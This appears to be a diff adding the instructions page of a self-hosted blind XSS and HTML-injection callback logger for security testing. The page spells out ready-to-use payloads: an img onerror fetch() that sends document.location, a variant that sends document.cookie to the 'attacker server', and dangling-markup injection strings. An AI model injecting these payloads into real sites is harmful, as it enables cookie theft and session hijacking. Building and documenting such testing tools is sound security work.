@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+	<head>
+		<title>Instructions</title>
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<link href="/styles/tailwind.css" rel="stylesheet">
+	</head>
+	<body class="bg-gradient-to-l from-teal-400 to-blue-300 ml-10 mt-5 flex flex-col gap-20">
+		<!-- <body class="bg-slate-400 ml-10 mt-5 flex flex-col gap-20"></body> -->
+		<nav class="absolute top-0 left-0 p-4 mb-5">
+			<a href="/"><svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24"><path fill="black" d="m7.825 13l5.6 5.6L12 20l-8-8l8-8l1.425 1.4l-5.6 5.6H20v2z"/></svg></a>
+		</nav>
+		<div>
+			<h1 class="text-5xl font-bold mb-10 mt-10">Get Started</h1>
+			<div class="flex space-y-10 flex-col">
+				<div class="flex space-x-5 flex-col text-lg">
+					<h3 class="text-lg font-bold">Example URL Formats:</h3>
+					<ul>
+						<li><b>HTML injection</b>: http://localhost:4000/?<span class="text-stone-100">url</span>=https://your-current-webpage&<span class="text-stone-100">by</span>=yourusername&<span class="text-stone-100">plaintext</span>=1234</li>
+						<li><b>XSS (with data exfiltration)</b>: http://localhost:4000/?<span class="text-stone-100">url</span>="+document.location+"&<span class="text-stone-100">plaintext</span>=XSSed&<span class="text-stone-100">by</span>=yourusername" (send with header, <b>xsend-xss-payload</b> )</li>
+						<li><b>XSS (with cookie exfiltration)</b>: http://localhost:4000/?<span class="text-stone-100">url</span>="+document.location+"&<span class="text-stone-100">cookie</span>=document.cookie&<span class="text-stone-100">by</span>=yourusername" (send with header, <b>xsend-xss-payload</b> )</li>
+						<li><b>Requesting/Other:</b> http://localhost:4000/logger/<span class="text-stone-100">{anything_goes_here}</span></b></li>
+					</ul>
+				</div>
+				<div class="flex space-x-5 flex-col text-lg">
+					<b>Parameters:</b>
+					<ul>
+						<li><b>url</b>: specifies location of the current document/webpage</li>
+						<li><b>by</b>: specifies username of the user that sent this payload</li>
+						<li>an <b>action</b> parameter (choices: <b>plaintext, b64, cookie, or none (leave blank)</b>)</li>
+						<li><b>xss: specifies if it's an XSS attack</b></li>
+					</ul>
+				</div>
+				<div class="flex space-x-5 flex-col text-lg">
+					<b>Headers for XSS testing</b>
+					<ul>
+						<li><b>xsend-xss-payload header</b> (This header is used to track which XSS payload was used when detection is successful)</li>
+					</ul>
+				</div>
+			</div>
+		</div>
+		<div>
+			<div class="leading-8 flex flex-col gap-2 text-lg">
+				<h2 class="text-2xl font-bold mb-1">Instructions for (blind) XSS testing</h2>
+				<ol>
+					<li>1.) Choose any action parameter such as <b>plaintext, b64, or cookie, or none (leave blank)</b></li>
+					<li>2.) In this case, I'll choose plaintext</li>
+					<li>3.) Craft the url with the required parameters to the attacker server: <b>http://localhost:4000/?url="+document.location+"&plaintext=XSSed&by=yourusername"</b></li>
+					<li>4.) Place it inside the <b>fetch()</b> function: <b>fetch("http://localhost:4000/?url="+document.location+"&plaintext=XSSed&by=mrunoriginal")</b></li>
+					<li>5.) Have the <b>fetch()</b> function include the required headers: <b>fetch("http://localhost:4000/?url="+document.location+"&plaintext=XSSed&by=mrunoriginal", {headers: {"xsend-xss-payload":"&lt;img src=x onerror=fetch()&gt;"}})</b></li>
+					<li>6.) Craft a payload for an XSS and insert the crafted url (Example: <b>&lt;img/src="x" onerror='fetch("http://localhost:4000/?url="+document.location+"&plaintext=XSSed&by=mrunoriginal", {headers: {"xsend-xss-payload":"&lt;img src=x onerror=fetch()&gt;"}})'&gt;)</b></li>
+					<li>7.) Now you can inject this payload and wait for your webhook to receive a request</li>
+					<h3 class="text-lg mt-4 font-bold"> &lt;img src="x" onerror='fetch("http://localhost:4000/?url="+document.location+"&plaintext=XSSed&by=mrunoriginal", {headers: {"xsend-xss-payload":"&lt;img src=x onerror=fetch()&gt;"}})'&gt;</h3>
+				</ol>
+			</div>
+		</div>
+		<div>
+			<div class="leading-8 leading-8 flex flex-col gap-2 text-lg">
+				<h2 class="text-2xl font-bold mb-1">Instructions for HTML Injection / Dangling Markup Injection</h2>
+				<ol>
+					<li>1.) Choose any action parameter such as <b>plaintext, b64 or none (leave blank)</b></li>
+					<li>2.) In this case, I'll choose plaintext</li>
+					<li>3.) Craft the url with the required parameters to the attacker server: <b>http://localhost:4000/?url=https://your-current-webpage&by=yourusername&plaintext=</b></li>
+					<li>4.) Craft the payload for dangling markup injection: <b>&lt;img src=http://localhost:4000/?url=https://your-current-webpage&by=yourusername&plaintext="</b></li>
+					<li>5.) Craft the payload for HTML injection: <b>&lt;img src=http://localhost:4000/?url=https://your-current-webpage&by=yourusername&plaintext=1234"&gt;</b></li>
+					<li>6.) Craft the payload for src attribute injection: <b>http://localhost:4000/?url=https://your-current-webpage&by=yourusername&plaintext=1234</b></li>
+					<li>7.) Now you can inject this payload and wait for your webhook to receive a request</li>
+					<h3 class="text-lg mt-4 font-bold">&lt;img src=http://localhost:4000/?url=https://your-current-webpage&plaintext="test"&gt;</h3>
+				</ol>
+			</div>
+		</div>
+		<div>
+			<div class="leading-8 leading-8 flex flex-col gap-2 text-lg">
+				<h2 class="text-2xl font-bold mb-1">Instructions for Other Blind Attacks</h2>
+				<ol>
+					<li>1.) Make a request to <span class="font-semibold">http://localhost:4000/logger/</span></li>
+					<li>2.) You can now see logged requests in your webhook</li>
+				</ol>
+			</div>
+		</div>
+	</body>
+</html>
